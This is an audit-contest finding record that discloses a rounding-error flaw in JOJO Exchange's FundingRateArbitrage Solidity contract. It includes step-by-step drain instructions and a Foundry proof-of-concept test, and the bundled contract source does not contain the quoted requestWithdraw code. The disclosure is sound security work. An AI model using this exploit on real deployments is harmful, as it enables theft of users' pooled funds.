{
  "Title": "H-2: FundingRateArbitrage contract can be drained due to rounding error",
  "Content": "# Issue H-2: FundingRateArbitrage contract can be drained due to rounding error \n\nSource: https://github.com/sherlock-audit/2023-12-jojo-exchange-update-judging/issues/57 \n\n## Found by \ndetectiveking\n## Summary\n\nIn the `requestWithdraw`, rounding in the wrong direction is done which can lead to contract being drained. \n\n## Vulnerability Detail\n\nIn the `requestWithdraw` function in `FundingRateArbitrage`, we find the following lines of code:\n\n```solidity\njusdOutside[msg.sender] -= repayJUSDAmount;\nuint256 index = getIndex();\nuint256 lockedEarnUSDCAmount = jusdOutside[msg.sender].decimalDiv(index);\nrequire(\n     earnUSDCBalance[msg.sender] >= lockedEarnUSDCAmount, \"lockedEarnUSDCAmount is bigger than earnUSDCBalance\"\n);\nwithdrawEarnUSDCAmount = earnUSDCBalance[msg.sender] - lockedEarnUSDCAmount;\n```\n\nBecause we round down when calculating `lockedEarnUSDCAmount`, `withdrawEarnUSDCAmount` is higher than it should be, which leads to us allowing the user to withdraw more than we should allow them to given the amount of JUSD they repaid. \n\nThe execution of this is a bit more complicated, let's go through an example. We will assume there's a bunch of JUSD existing in the contract and the attacker is the first to deposit. \n\nSteps:\n\n1. The attacker deposits 1 unit of USDC and then manually sends in another 100 * 10^6 - 1 (not through deposit, just a transfer). The share price / price per earnUSDC will now be $100. Exactly one earnUSDC is in existence at the moment. \n2. Next the attacker creates a new EOA and deposits a little over $101 worth of USDC (so that after fees we can get to the $100), giving one earnUSDC to the EOA. The attacker will receive around $100 worth of JUSD from doing this. \n3. Attacker calls `requestWithdraw` with `repayJUSDAmount = 1` with the second newly created EOA\n4. `lockedEarnUSDCAmount` is rounded down to 0 (since `repayJUSDAmount` is subtracted from jusdOutside[msg.sender]\n5. `withdrawEarnUSDCAmount` will be `1`\n6. After `permitWithdrawRequests` is called, attacker will be able to withdraw the $100 they deposited through the second EOA (granted, they lost the deposit and withdrawal fees) while only having sent `1` unit of `JUSD` back. This leads to massive profit for the attacker. \n\nAttacker can repeat steps 2-6 constantly until the contract is drained of JUSD. \n \n## Impact\n\nAll JUSD in the contract can be drained\n\n## Code Snippet\n\nhttps://github.com/JOJOexchange/smart-contract-EVM/blob/main/src/FundingRateArbitrage.sol#L283-L300\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRound up instead of down \n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  valid because { This is valid and also a dupp of 054 due to the same underlying cause of first deposit attack; but in this the watson explained the exploit scenario of the inflation attack}\n\n\n\n**nevillehuang**\n\nrequest poc\n\n**sherlock-admin**\n\nPoC requested from @detectiveking123\n\nRequests remaining: **4**\n\n**JoscelynFarr**\n\nI think this issue is similar to https://github.com/sherlock-audit/2023-12-jojo-exchange-update-judging/issues/54\n\n**nevillehuang**\n\n@JoscelynFarr Seems right, @detectiveking123 do you agree that this seems to be related to a typical first depositor inflation attack.\n\n**detectiveking123**\n\n@nevillehuang I am not exactly sure how this should be judged. \n\nThe attack that I describe here chains two separate vulnerabilities together (one of which is the rounding error and the other which is the same root cause as the share inflation attack) to drain all the funds existing in the contract, which is clearly a high. **It also doesn't rely on any front-running on Arbitrum assumptions, while the other issue does. In fact, no interaction from any other users is necessary for the attacker to drain all the funds.** The exploit that is described in the other issue cannot actually drain all the funds in the contract like this one can, but simply drain user deposits if they can frontrun them. \n\nTo clarify, the rounding error that I describe here is different from the rounding error described in the ERC4626 inflation style exploit (so I guess there are two separate rounding errors that optimally should be chained together for this exploit). \n\nDo you still want me to provide a code POC here? I already have an example in the issue description of how the attack can be performed. \n\n**nevillehuang**\n\n@detectiveking123 Yes, please provide me a coded PoC in 1-2 days so that I can verify the draining impact, because it does share similar root causes of direct donation of funds as the first inflation attack.\n\n**detectiveking123**\n\n@nevillehuang let me get it to you by tomorrow\n\n**detectiveking123**\n\n@nevillehuang \n\n```\n    function testExploit() public {\n        jusd.mint(address(fundingRateArbitrage), 5000e6);\n        // net value starts out at 0 :)\n        console.log(fundingRateArbitrage.getNetValue());\n\n        vm.startPrank(Owner); \n        fundingRateArbitrage.setMaxNetValue(10000000e6); \n        fundingRateArbitrage.setDefaultQuota(10000000e6); \n        vm.stopPrank(); \n                 \n        initAlice();\n        // Alice deposits twice\n        fundingRateArbitrage.deposit(1);\n        USDC.transfer(address(fundingRateArbitrage), 100e6);\n        fundingRateArbitrage.deposit(100e6);\n        vm.stopPrank();\n\n        vm.startPrank(alice);\n        fundingRateArbitrage.requestWithdraw(1);\n        fundingRateArbitrage.requestWithdraw(1);\n        vm.stopPrank();\n\n        vm.startPrank(Owner); \n        uint256[] memory requestIds = new uint256[](2);\n        requestIds[0] = 0; \n        requestIds[1] = 1;\n        fundingRateArbitrage.permitWithdrawRequests(requestIds); \n        vm.stopPrank(); \n\n        // Alice is back to her initial balance, but now has a bunch of extra JUSD deposited for her into jojodealer!\n        console.log(USDC.balanceOf(alice));\n        (,uint secondaryCredit,,,) = jojoDealer.getCreditOf(alice);\n        console.log(secondaryCredit);\n    }\n```\n\nAdd this to `FundingRateArbitrageTest.t.sol`\n\nYou will also need to add:\n\n```\n    function transfer(address to, uint256 amount) public override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n```\n\nto TestERC20\n\nAnd change initAlice to:\n\n```\n    function initAlice() public {\n        USDC.mint(alice, 300e6 + 1);\n        jusd.mint(alice, 300e6 + 1);\n        vm.startPrank(alice);\n        USDC.approve(address(fundingRateArbitrage), 300e6 + 1);\n        jusd.approve(address(fundingRateArbitrage), 300e6 + 1); \n    }\n```\n**FYI for this exploit the share inflation is helpful but not necessary**. The main issue is the rounding down of `lockedEarnUSDCAmount` in `requestWithdraw`. Even if the share price is 1 cent for example, we will slowly be able to drain JUSD from the contract. An assumption for profitability is that the share price is nontrivial though (so if it's really small it won't be profitable for the attacker b/c of gas fees and deposit fees, though you can still technically drain). \n\n\n\n**nevillehuang**\n\nThis issue is exactly the same as #21 and the **original** submission shares the same root cause of depositor inflation to make the attack feasible, given share price realistically won't be of such a low price. I will be duplicating accordingly. Given and subsequent deposits can be drained, I will be upgrading to high severity\n\n@detectiveking123 If you want to escalate feel free,I will maintain my stance here.\n\n**IAm0x52**\n\nSame fix as #54\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/136",
  "Code": [
    {
      "filename": "src/FundingRateArbitrage.sol",
      "content": "/*\n    Copyright 2022 JOJO Exchange\n    SPDX-License-Identifier: BUSL-1.1\n*/\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\nimport \"./JOJODealer.sol\";\nimport \"./libraries/SignedDecimalMath.sol\";\nimport \"./interfaces/internal/IPriceSource.sol\";\n\npragma solidity ^0.8.19;\n\n/// @notice This contract involves offsetting trades in both the spot and perpetual contract markets\n/// to capture the funding rate income in perpetual contract trading. Liquidy provider can deposit usdc\n/// to this pool and accumulate interest.\ncontract FundingRateArbitrage is Ownable, ERC20 {\n    struct WithdrawalRequest {\n        uint256 earnUSDCAmount;\n        address user;\n        bool isExecuted;\n    }\n\n    using SafeERC20 for IERC20;\n    using SignedDecimalMath for uint256;\n\n    address public immutable jojoDealer;\n    address public immutable perpMarket;\n    address public immutable usdc;\n    address public immutable jusd;\n\n    uint256 public maxNetValue;\n    uint256 public depositFeeRate;\n    uint256 public withdrawFeeRate;\n    uint256 public withdrawSettleFee;\n    uint256 public defaultUsdcQuota;\n    uint256 public minimumWithdraw;\n    mapping(address => uint256) public maxUsdcQuota;\n\n    mapping(address => uint256) public usdcTotalDepositAmount;\n    mapping(address => uint256) public usdcTotalWithdrawAmount;\n    mapping(address => address) public collateralPrice;\n    mapping(address => bool) public collateralWhiteList;\n    address[] public collateralList;\n\n    WithdrawalRequest[] public withdrawalRequests;\n\n    // Event\n    event DepositToHedging(address from, uint256 USDCAmount, uint256 feeAmount, uint256 earnUSDCAmount);\n\n    event RequestWithdrawFromHedging(address from, uint256 earnUSDCAmount, uint256 index);\n\n    event PermitWithdraw(address from, uint256 USDCAmount, uint256 feeAmount, uint256 earnUSDCAmount, uint256 index);\n\n    event Swap(address fromToken, address toToken, uint256 payAmount, uint256 receivedAmount);\n\n    constructor(\n        address _collateral,\n        address _jojoDealer,\n        address _perpMarket,\n        address _Operator,\n        address _oracle\n    )\n        ERC20(\"earnUSDC\", \"earnUSDC\")\n        Ownable()\n    {\n        collateralList.push(_collateral);\n        collateralWhiteList[_collateral] = true;\n        collateralPrice[_collateral] = _oracle;\n        jojoDealer = _jojoDealer;\n        perpMarket = _perpMarket;\n        (address USDC, address JUSD,,,,,) = JOJODealer(jojoDealer).state();\n        usdc = USDC;\n        jusd = JUSD;\n        JOJODealer(jojoDealer).setOperator(_Operator, true);\n        IERC20(usdc).approve(jojoDealer, type(uint256).max);\n    }\n\n    // View\n\n    /// @notice this function is to return the sum of netValue in whole system.\n    /// including the netValue in collateral system, trading system and buffer usdc\n    function getNetValue() public view returns (uint256) {\n        uint256 collateralValue;\n        for (uint256 i = 0; i < collateralList.length;) {\n            uint256 collateralAmount = IERC20(collateralList[i]).balanceOf(address(this));\n            uint256 price = IPriceSource(collateralPrice[collateralList[i]]).getAssetPrice();\n            collateralValue += collateralAmount.decimalMul(price);\n            unchecked {\n                ++i;\n            }\n        }\n        uint256 usdcBuffer = IERC20(usdc).balanceOf(address(this));\n        (int256 perpNetValue,,,) = JOJODealer(jojoDealer).getTraderRisk(address(this));\n        (, uint256 jusdAmount,,,) = JOJODealer(jojoDealer).getCreditOf(address(this));\n        return SafeCast.toUint256(perpNetValue) + collateralValue + usdcBuffer - jusdAmount;\n    }\n\n    function getIndex() public view returns (uint256) {\n        return SignedDecimalMath.decimalDiv(getNetValue() + 1, totalSupply() + 1e12);\n    }\n\n    function getCollateralList() public view returns(address[] memory) {\n        return collateralList;\n    }\n\n    function getCollateralPrice(address token) public view returns(uint256) {\n        return IPriceSource(collateralPrice[token]).getAssetPrice();\n    }\n\n    function buildSpotSwapData(\n        address approveTarget,\n        address swapTarget,\n        uint256 payAmount,\n        bytes memory callData\n    )\n        public\n        pure\n        returns (bytes memory spotTradeParam)\n    {\n        spotTradeParam = abi.encode(approveTarget, swapTarget, payAmount, callData);\n    }\n\n    //Only Owner\n\n    /// @notice this function is to set Operator who can operate this pool\n    function setOperator(address operator, bool isValid) public onlyOwner {\n        JOJODealer(jojoDealer).setOperator(operator, isValid);\n    }\n\n    function setMaxNetValue(uint256 newMaxNetValue) public onlyOwner {\n        maxNetValue = newMaxNetValue;\n    }\n\n    function setDepositFeeRate(uint256 newDepositFeeRate) public onlyOwner {\n        depositFeeRate = newDepositFeeRate;\n    }\n\n    function setWithdrawFeeRate(uint256 newWithdrawFeeRate) public onlyOwner {\n        withdrawFeeRate = newWithdrawFeeRate;\n    }\n\n    function setDefaultQuota(uint256 defaultQuota) public onlyOwner {\n        defaultUsdcQuota = defaultQuota;\n    }\n\n    /// @notice this function is to set the personal deposit quota\n    function setPersonalQuota(address to, uint256 personalQuota) public onlyOwner {\n        maxUsdcQuota[to] = personalQuota;\n    }\n\n    function setWithdrawSettleFee(uint256 newWithdrawSettleFee) public onlyOwner {\n        withdrawSettleFee = newWithdrawSettleFee;\n    }\n\n    function setMinimumWithdraw(uint256 _minimumWithdraw) public onlyOwner {\n        minimumWithdraw = _minimumWithdraw;\n    }\n\n    // 1. update oracle\n    // 2. add collateral\n    function addCollateral(address token) public onlyOwner {\n        collateralList.push(token);\n        collateralWhiteList[token] = true;\n    }\n\n    function updateOracle(address token, address oracle) public onlyOwner {\n        collateralPrice[token] = oracle;\n    }\n    // 1. remove\n    // 2. set oracle = address(0)\n    function removeCollateral(address token) public onlyOwner {\n        collateralWhiteList[token] = false;\n        for (uint256 i = 0; i < collateralList.length;) {\n            if (collateralList[i] == token) {\n                collateralList[i] = collateralList[collateralList.length - 1];\n                collateralList.pop();\n                break;\n            }\n            unchecked {\n                ++i;\n            }\n        }\n    }\n    \n    /// @notice this function is to swap usdc to token and deposit to collateral system\n    /// @param minReceivedCollateral is the minimum token received\n    /// @param spotTradeParam is param to swap usdc to token, can build by this function: `buildSpotSwapData`\n    function swapBuyToken(uint256 minReceivedCollateral, address token, bytes memory spotTradeParam) public onlyOwner {\n        require(collateralWhiteList[token], \"collateral is not in the whitelist\");\n        uint256 receivedCollateral = _swap(token, spotTradeParam, true);\n        require(receivedCollateral >= minReceivedCollateral, \"SWAP SLIPPAGE\");\n    }\n\n    /// @notice this function is to withdraw token to the pool and swap token to usdc\n    /// @param minReceivedUSDC is the minimum usdc received\n    /// @param spotTradeParam is param to swap token to usdc, can build by this function: `buildSpotSwapData`\n    function swapSellToken(uint256 minReceivedUSDC, address token, bytes memory spotTradeParam) public onlyOwner {\n        require(collateralWhiteList[token], \"collateral is not in the whitelist\");\n        uint256 receivedUSDC = _swap(token, spotTradeParam, false);\n        require(receivedUSDC >= minReceivedUSDC, \"SWAP SLIPPAGE\");\n    }\n\n    function _swap(address token, bytes memory param, bool isBuyingToken) private returns (uint256 receivedAmount) {\n        address fromToken;\n        address toToken;\n        if (isBuyingToken) {\n            fromToken = usdc;\n            toToken = token;\n        } else {\n            fromToken = token;\n            toToken = usdc;\n        }\n        uint256 toTokenReserve = IERC20(toToken).balanceOf(address(this));\n        (address approveTarget, address swapTarget, uint256 payAmount, bytes memory callData) =\n            abi.decode(param, (address, address, uint256, bytes));\n        IERC20(fromToken).safeApprove(approveTarget, 0);\n        IERC20(fromToken).safeApprove(approveTarget, payAmount);\n        (bool isSuccess,) = swapTarget.call(callData);\n        if (!isSuccess) {\n            assembly {\n                let ptr := mload(0x40)\n                let size := returndatasize()\n                returndatacopy(ptr, 0, size)\n                revert(ptr, size)\n            }\n        }\n        receivedAmount = IERC20(toToken).balanceOf(address(this)) - toTokenReserve;\n        emit Swap(fromToken, toToken, payAmount, receivedAmount);\n    }\n\n    // JOJODealer Operations\n    /// @notice this function is to deposit the buffered usdc from pool to trading system\n    /// @param primaryAmount is the expected deposit primary amount.\n    function depositUSDCToPerp(uint256 primaryAmount) public onlyOwner {\n        JOJODealer(jojoDealer).deposit(primaryAmount, 0, address(this));\n    }\n\n    /// @notice this function is to withdraw the buffered usdc from trading system to pool\n    /// @param primaryAmount is the expected withdraw primary amount.\n    function fastWithdrawUSDCFromPerp(uint256 primaryAmount) public onlyOwner {\n        JOJODealer(jojoDealer).fastWithdraw(address(this), address(this), primaryAmount, 0, false, \"\");\n    }\n\n    function fastWithdrawJUSDFromPerp(uint256 secondaryAmount) public onlyOwner {\n        JOJODealer(jojoDealer).fastWithdraw(address(this), address(this), 0, secondaryAmount, false, \"\");\n        IERC20(jusd).safeTransfer(msg.sender, secondaryAmount);\n    }\n\n    // LP Functions\n\n    /// @notice this function is called by liquidity providers, users can deposit usdc to arbitrage\n    /// @dev During the deposit, users usdc will transfer to the system and system will return\n    /// the equivalent amount of jusd which deposit to the trading system.\n    /// @param amount is the expected deposit usdc amount.\n    function deposit(uint256 amount) external {\n        require(amount != 0, \"deposit amount is zero\");\n        require(\n            amount.decimalMul(Types.ONE - depositFeeRate) > withdrawSettleFee,\n            \"The deposit amount is less than the minimum withdrawal amount\"\n        );\n        uint256 feeAmount = amount.decimalMul(depositFeeRate);\n        usdcTotalDepositAmount[msg.sender] += amount;\n        if (feeAmount > 0) {\n            amount -= feeAmount;\n            IERC20(usdc).safeTransferFrom(msg.sender, owner(), feeAmount);\n        }\n        uint256 earnUSDCAmount = amount.decimalDiv(getIndex());\n        IERC20(usdc).safeTransferFrom(msg.sender, address(this), amount);\n        _mint(msg.sender, earnUSDCAmount);\n        require(getNetValue() <= maxNetValue, \"net value exceed limitation\");\n        uint256 quota = maxUsdcQuota[msg.sender] == 0 ? defaultUsdcQuota : maxUsdcQuota[msg.sender];\n        require(balanceOf(msg.sender).decimalMul(getIndex()) <= quota, \"usdc amount bigger than quota\");\n        emit DepositToHedging(msg.sender, amount, feeAmount, earnUSDCAmount);\n    }\n\n    /// @notice this function is to submit a withdrawal which wiil permit by our system in 24 hours\n    /// The main purpose of this function is to capture the interest and avoid the DOS attacks.\n    /// @dev users need to withdraw jusd from trading system firstly or by jusd, then transfer jusd to\n    /// the pool and get usdc back\n    function requestWithdraw(uint256 earnUSDCAmount) external returns (uint256) {\n        IERC20(address(this)).safeTransferFrom(msg.sender, address(this), earnUSDCAmount);\n        uint256 index = getIndex();\n        withdrawalRequests.push(WithdrawalRequest(earnUSDCAmount, msg.sender, false));\n        require(earnUSDCAmount.decimalMul(index) >= minimumWithdraw, \"Withdraw amount is smaller than minimumWithdraw\");\n        require(earnUSDCAmount.decimalMul(index) >= withdrawSettleFee, \"Withdraw amount is smaller than settleFee\");\n        uint256 withdrawIndex = withdrawalRequests.length - 1;\n        emit RequestWithdrawFromHedging(msg.sender, earnUSDCAmount, withdrawIndex);\n        return withdrawIndex;\n    }\n\n    /// @notice this function is to permit withdrawals which are submit by liqudity provider\n    /// @param requestIDList is the request ids\n    function permitWithdrawRequests(uint256[] memory requestIDList) external onlyOwner {\n        uint256 index = getIndex();\n        for (uint256 i; i < requestIDList.length; i++) {\n            WithdrawalRequest storage request = withdrawalRequests[requestIDList[i]];\n            require(!request.isExecuted, \"request has been executed\");\n            uint256 USDCAmount = request.earnUSDCAmount.decimalMul(index);\n            require(USDCAmount >= withdrawSettleFee, \"USDCAmount need to bigger than withdrawSettleFee\");\n            usdcTotalWithdrawAmount[request.user] += USDCAmount;\n            uint256 feeAmount = (USDCAmount - withdrawSettleFee).decimalMul(withdrawFeeRate) + withdrawSettleFee;\n            if (feeAmount > 0) {\n                IERC20(usdc).safeTransfer(owner(), feeAmount);\n            }\n            IERC20(usdc).safeTransfer(request.user, USDCAmount - feeAmount);\n            request.isExecuted = true;\n            _burn(address(this), request.earnUSDCAmount);\n            emit PermitWithdraw(request.user, USDCAmount, feeAmount, request.earnUSDCAmount, requestIDList[i]);\n        }\n    }\n}"
    }
  ]
}